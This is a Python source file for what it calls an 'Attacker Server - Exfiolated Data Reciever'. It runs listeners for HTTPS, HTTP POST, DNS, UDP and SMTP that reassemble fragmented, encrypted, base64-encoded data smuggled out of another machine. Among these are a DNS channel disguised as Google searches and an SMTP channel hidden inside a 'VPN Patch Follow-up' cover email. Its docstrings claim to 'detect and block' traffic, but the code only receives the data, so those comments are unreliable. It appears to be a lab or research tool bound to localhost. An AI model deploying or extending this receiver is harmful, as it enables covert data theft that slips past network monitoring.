import base64, socket, ssl, threading, urllib.parse,os
from dotenv import load_dotenv
from encryption_manager import EncryptionManager
HOST = "127.0.0.1";HTTPS_PORT = 443;DNS_PORT = 53;UDP_PORT = 5000;SMTP_PORT = 25    
## Load AES Key for decryption
load_dotenv()
key = os.environ.get("AES_key")
if not key:
    raise Exception("AES Key not set. Please check your .env file.")
print(" AES Key loaded successfully.")

def handle_https(client_socket):
    """Detect and block unusual HTTPS behavior while keeping the connection open."""
    try:
        print("[*] Monitoring HTTPS traffic...")
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile="certs/cert.pem", keyfile="certs/key.pem")
        secure_socket = context.wrap_socket(client_socket, server_side=True)

        received_data = []  # Store received fragments

        while True:
            data = secure_socket.recv(2048).decode(errors="ignore")
            try:
                data = EncryptionManager.decrypt(data,key)
            except Exception as e:
                print('')
            if not data:
                break  # Exit loop when client disconnects

            print(f"[+] HTTPS Data: {data}")
            if "EOF" not in data:
                received_data.append(data)

            # Check for end of transmission
            if "EOF" in data:
                break  # Stop receiving

            secure_socket.send(b"Data received securely.")  # Keep connection alive
        full_message = "".join(received_data)
        try:
                decoded_message = base64.urlsafe_b64decode(full_message).decode(errors="ignore")
        except Exception:
                decoded_message = full_message    

        print("[+] Data Recieved:", decoded_message)

        secure_socket.close()
    except Exception as e:
        print(f"[!] HTTPS Error: {e}")

def extract_message_from_request(request):
    """Extract the 'message' value from a raw HTTP POST request."""
    #  Find start of POST body (after headers)
    content_index = request.find("\r\n\r\n")  # Find the double newline separating headers and body
    if content_index == -1:
        print("[!] No POST data found.")
        return None

    post_data = request[content_index + 4:]  # Extract body

    #  Parse form-encoded data (application/x-www-form-urlencoded)
    parsed_data = urllib.parse.parse_qs(post_data)
    
    # Extract message value
    message_values = parsed_data.get("message", [])
    if message_values:
        return message_values[0]  # First message fragment
    else:
        print("[!] 'message' key not found in POST data.")
        return None
    
def handle_httpsPOST():
    """HTTPS traffic via POST requests"""
    try:
        print("[*] Monitoring HTTPS POST requests...")
        received_data = []  # Store received fragments

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((HOST, 8080))  # Listening on port 8080
        server_socket.listen(5)

        while True:
            client_socket, addr = server_socket.accept()
            request = client_socket.recv(4096).decode(errors="ignore")
            print(f"[+] Received HTTPS POST Request from {addr}:\n{request}")

            # Extract "message" field from POST request
            extracted_message = extract_message_from_request(request)            
            try:
                extracted_message = EncryptionManager.decrypt(extracted_message,key)
            except Exception as e:
                print('')
            if extracted_message:
                if "EOF" not in extracted_message:
                    received_data.append(extracted_message)

                # Check for end of transmission
                if "EOF" in extracted_message:
                    client_socket.send(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
                    break  

            #  Respond to the client
            client_socket.send(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
            full_message = "".join(received_data)
            try:
                    decoded_message = base64.urlsafe_b64decode(full_message).decode(errors="ignore")
        
            except Exception:
                    decoded_message = full_message    

        print("[+] Data Recieved:", decoded_message)

    except Exception as e:
        print(f"[!] HTTPS Error: {e}")

   

# 🔹 DNS Server with Basic Anomaly Detection
def handle_dns():
    """Detect Google-like search exfiltration and reconstruct the message."""
    print("[*] Monitoring Google Search-based DNS traffic...")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((HOST, DNS_PORT))
    received_fragments = []  # Store received fragments

    while True:
        message, addr = server_socket.recvfrom(4096)
        decoded_message = message.decode(errors="ignore")
        print(f"[+] Recieved DNS from {addr}: {decoded_message}")

        if "EOF" not in decoded_message:
            fragment = decoded_message.split("q=")[1]  #  Extract base64 part after "q="
            try:
                fragment = EncryptionManager.decrypt(fragment,key)
            except Exception as e:
                print('')
            received_fragments.append(fragment)  #  Store fragment

        if "EOF" in decoded_message:
            full_message = "".join(received_fragments)  #  Combine all fragments

            #  Decode Base64
            try:
                decoded_message = base64.urlsafe_b64decode(full_message).decode(errors="ignore")
            except Exception:
                decoded_message = full_message  # Fallback if not Base64

            print("[+] Data Extracted from Google Searches:", decoded_message)
            received_fragments.clear()  #  Reset buffer for next session
            break  # Stop receiving
        
# 🔹 UDP Server for Monitoring Custom Protocols
def handle_udp():
    """Detect UDP-based exfiltration attempts and reconstruct the message."""
    print("[*] Monitoring UDP traffic...")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((HOST, UDP_PORT))

    received_fragments = []  #  Store all received UDP fragments

    while True:
        message, addr = server_socket.recvfrom(4096)
        decoded_message = message.decode(errors="ignore")
        print(f"[+] UDP Data from {addr}: {decoded_message}")
        try:
                decoded_message = EncryptionManager.decrypt(decoded_message,key)
        except Exception as e:
                print('')
        if "EOF" not in decoded_message:
            received_fragments.append(decoded_message)  #  Append fragments

        if "EOF" in decoded_message:
            full_message = "".join(received_fragments)  #  Combine all fragments

            #  Decode Base64
            try:
                decoded_message = base64.urlsafe_b64decode(full_message).decode(errors="ignore")
            except Exception:
                decoded_message = full_message  # Fallback if not Base64

            print("[+] Data Received:", decoded_message)
            break 



def handle_smtp():
    """ SMTP Email data exfiltration."""
    print("[*] Monitoring SMTP traffic...")

    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((HOST, SMTP_PORT)) 
        server_socket.listen(5)

        print(f"[*] SMTP Server listening on {HOST}:{SMTP_PORT}...")

        while True:
            client_socket, addr = server_socket.accept()
            print(f"[+] SMTP Connection received from {addr}")

            received_data = []
            while True:
                data = client_socket.recv(4096).decode(errors="ignore")  #  Read larger chunks
                if not data:
                    break
                received_data.append(data)

            full_message = "\n".join(received_data)  # Combine all fragments

            #  Extract Base64-encoded content from email body
            try:
                email_lines = full_message.split("\n")  #  Split by lines
                
                #  Find the encoded message (typically at the end of the email body)
                base64_payload = None
                for line in email_lines:
                    if line.strip() and not line.startswith(("From:", "To:", "Subject:", "Best regards,"," "," From:","Dear","Hope you’re doing well.","I came across","Looking forward to your thoughts.","Antti","VPN Patch Follow-up")):
                        base64_payload = "".join(line.strip()) #  Extract encoded part
               
                        
                if base64_payload:
                    decoded_message = base64.urlsafe_b64decode(base64_payload).decode(errors="ignore")
                    try:
                            decoded_message = EncryptionManager.decrypt(decoded_message,key)
                    except Exception as e:
                            print('')              
                    print ("Message: \n" ,full_message )
                    print("[+] Decoded String:", decoded_message)
                else:
                    print("[!] No Base64 payload found in email body.")
            except Exception as e:
                print("[!] Failed to decode Base64:", e)
                print("[+] Raw Received Data:\n", full_message)  #  Fallback to show raw data

            client_socket.close()

    except Exception as e:
        print(f"[!] SMTP Error: {e}")


# 🔹 Start HTTPS Server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, HTTPS_PORT))
server_socket.listen(5)
print("Attacker Server - Exfiolated Data Reciever")

print(f"[*] HTTPS Server listening on {HOST}:{HTTPS_PORT}...")

# 🔹 Start Monitoring Threads **only once**
threading.Thread(target=handle_httpsPOST, daemon=True).start()
threading.Thread(target=handle_dns, daemon=True).start()
threading.Thread(target=handle_udp, daemon=True).start()
threading.Thread(target=handle_smtp, daemon=True).start()

# 🔹 Accept HTTPS connections continuously
while True:
    client_socket, addr = server_socket.accept()
    print(f"[+] Connection received from {addr}")
    threading.Thread(target=handle_https, args=(client_socket,), daemon=True).start()
